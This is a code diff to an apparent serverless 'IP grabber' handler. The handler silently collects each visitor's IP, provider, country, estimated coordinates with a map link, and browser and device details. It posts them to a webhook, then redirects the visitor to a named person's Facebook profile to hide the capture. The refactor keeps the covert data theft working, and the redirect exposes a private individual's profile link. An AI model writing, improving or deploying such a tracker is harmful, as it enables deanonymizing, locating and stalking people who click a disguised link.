@@ -56,47 +56,44 @@ export default async function handler(req, res) {
             return;
         }
 
-        // If hosting is true, send a simple alert message
-        if (ipDetails.hosting) {
-            const alertMessage = {
-                username: "Alert Logger",
+        const userAgent = req.headers['user-agent'] || 'Unknown';
+        const acceptLanguage = req.headers['accept-language'] || 'Unknown';
+        const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
+        const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
+        const referer = req.headers['referer'] || 'No referer';
+        
+        const deviceType = detectDeviceType(userAgent);
+        const browserEngine = /Chrome|Chromium|Edg/.test(userAgent) ? 'Blink' :
+                              /Safari/.test(userAgent) ? 'WebKit' :
+                              /Gecko/.test(userAgent) ? 'Gecko' :
+                              /Trident/.test(userAgent) ? 'Trident' : 'Unknown';
+        const os = /Windows/.test(userAgent) ? 'Windows' :
+                   /Mac/.test(userAgent) ? 'macOS' :
+                   /Android/.test(userAgent) ? 'Android' :
+                   /Linux/.test(userAgent) ? 'Linux' : 'Unknown';
+
+        const coords = ipDetails.lat && ipDetails.lon
+            ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
+            : "Not available";
+
+        // Prepare different messages based on hosting status
+        const message = ipDetails.hosting
+            ? {
+                username: "Hosting Detection Logger",
                 content: "⚠️ **Alert:** User sent IP grabber link to target.",
                 embeds: [
                     {
-                        title: "IP Grabber Alert",
-                        color: 0xFF0000, // Red color for alert
+                        title: "Hosting Access Detected",
+                        color: 0xFF0000,
                         fields: [
                             { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                             { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
-                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true }
+                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                         ]
                     }
                 ]
-            };
-            await sendToWebhook(alertMessage);
-        } else {
-            // For non-hosting, send the usual detailed message
-            const userAgent = req.headers['user-agent'] || 'Unknown';
-            const acceptLanguage = req.headers['accept-language'] || 'Unknown';
-            const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
-            const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
-            const referer = req.headers['referer'] || 'No referer';
-            
-            const deviceType = detectDeviceType(userAgent);
-            const browserEngine = /Chrome|Chromium|Edg/.test(userAgent) ? 'Blink' :
-                                  /Safari/.test(userAgent) ? 'WebKit' :
-                                  /Gecko/.test(userAgent) ? 'Gecko' :
-                                  /Trident/.test(userAgent) ? 'Trident' : 'Unknown';
-            const os = /Windows/.test(userAgent) ? 'Windows' :
-                       /Mac/.test(userAgent) ? 'macOS' :
-                       /Android/.test(userAgent) ? 'Android' :
-                       /Linux/.test(userAgent) ? 'Linux' : 'Unknown';
-
-            const coords = ipDetails.lat && ipDetails.lon
-                ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
-                : "Not available";
-
-            const mainMessage = {
+            }
+            : {
                 username: "Extended Device Info Logger",
                 embeds: [
                     {
@@ -132,8 +129,8 @@ export default async function handler(req, res) {
                 ]
             };
 
-            await sendToWebhook(mainMessage);
-        }
+        // Send the message to the webhook
+        await sendToWebhook(message);
         
         res.writeHead(302, { Location: 'https://www.facebook.com/janethalejandra.gonzalez.7?mibextid=LQQJ4d' });
         res.end();
